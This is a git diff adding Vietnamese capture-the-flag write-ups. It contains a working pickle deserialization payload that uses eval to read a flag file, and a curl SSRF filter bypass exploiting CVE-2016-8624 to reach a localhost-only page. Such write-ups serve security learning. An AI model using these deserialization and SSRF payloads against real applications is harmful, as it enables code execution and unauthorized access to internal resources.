@@ -34,6 +34,7 @@
 - [Nginx Alias](#nginx-alias)
 - [Steal Cookie](#steal-cookie)
 - [Escape the session](#escape-the-session)
+- [SVATTT 2016 Quals Curl](#svattt-2016-quals-curl)
 
 
 ## Baby Address Note
@@ -385,4 +386,58 @@ for i in range(1, 101):
 ## Escape the session
 
 1. Từ title của web cho biết đây sẽ là lỗ hổng deserialize
-2. 
+2. Từ source code có được, có thể thấy ở đây ngta serialize object info bằng hàm pickle.dump sau đó encode b64
+3. Còn function check session sẽ decode b64 rồi deserialize bằng pickle.loads() .
+5. Ta sẽ craft obj payload để đọc file với method __reduce__ (Khi deserialize thì phương thức __reduce__ đó sẽ được gọi với mục đích là tái tạo lại object đó).
+6. Payload:
+```
+import pickle
+import base64
+
+
+class Payload:
+    def __reduce__(self):
+        command = "open('/flag.txt').read()"
+        return (eval, (command,))
+
+
+payload = {'name': Payload()}
+
+print(base64.b64encode(pickle.dumps(payload)))
+#gASVPgAAAAAAAAB9lIwEbmFtZZSMCGJ1aWx0aW5zlIwEZXZhbJSTlIwYb3BlbignL2ZsYWcudHh0JykucmVhZCgplIWUUpRzLg==
+```
+
+## SVATTT 2016 Quals Curl
+
+1. Bài này ta có source code
+```
+<!-- 
+// index.php
+if (!empty($_POST['url']) && is_string($_POST['url'])){
+  if(!filter_var($_POST['url'], FILTER_VALIDATE_URL) === false  && substr($_POST['url'],0,7) === "http://"){
+    $url = strtolower(escapeshellarg($_POST['url']));
+    $ret = `curl -v $url 2>&1`;
+    echo "<p>URL: ".$url."</p>";
+    if( !preg_match('/(\.localhost|%|flag)/is',$url,$matches) && !preg_match("/(Connected.*\(172\..*?\))/is",$ret,$matches)) {
+      echo "<br /><pre>$ret</pre>";
+    } else {
+      echo "<font color=Red>Hacker detected [{$matches[1]}]!</font>";
+    }
+  } else {
+    echo "<font color=Red>Invalid URL!</font>";
+  }
+}
+-->
+
+<!--
+// flag.php
+$ip = $_SERVER['REMOTE_ADDR'];
+echo $ip."\n";
+if($ip === '127.0.0.1' || $ip === '::1') echo "FLAG_HERE";
+-->
+```
+2. Ở đây ta thấy param `url` được filter để tránh ssrf nhưng nhận thấy ở header User-Agent nhận thấy curl đang dùng phiên bản dính lỗ hổng CVE-2016-8624.
+3. Ví dụ khi gửi payload `http://www.google.com#@127.0.0.1/flag.php` thì curl sẽ curl 2 site là trang google và trang localhost.
+4. Tuy nhiên flag bị filter nên ta sẽ bypass bằng cách gửi payload sau `http://google.com#@127.0.0.1/fla[g-h].php`
+
+## 
